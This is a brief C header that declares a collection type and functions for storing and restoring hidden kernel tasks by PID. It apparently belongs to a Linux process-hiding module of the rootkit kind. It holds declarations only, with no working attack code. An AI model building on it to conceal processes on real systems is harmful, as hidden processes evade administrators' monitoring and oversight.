typedef struct hiddenProcessCollection *HiddenProcessCollection;

typedef struct restorableHiddenTask *RestorableHiddenTask ;

struct restorableHiddenTask { //TODO: rename this
	void *task;
	struct pid *originalPid;
	int pidNumber;
};

HiddenProcessCollection createHiddenProcessCollection(void);
void destoryHiddenProcessCollection(HiddenProcessCollection collection);
int isHiddenProcessCollectionFull(HiddenProcessCollection collection);
void addHiddenProcessToCollection(HiddenProcessCollection collection, RestorableHiddenTask restorableHiddenTask);

int isPidInCollection(HiddenProcessCollection collection, int pid);
RestorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid);

int isTaskInCollection(HiddenProcessCollection collection, void *task);
RestorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task); //TODO: chagne this not to use void*

RestorableHiddenTask removeAnyHiddenTask(HiddenProcessCollection collection); //returns NULL if no tasks are hidden
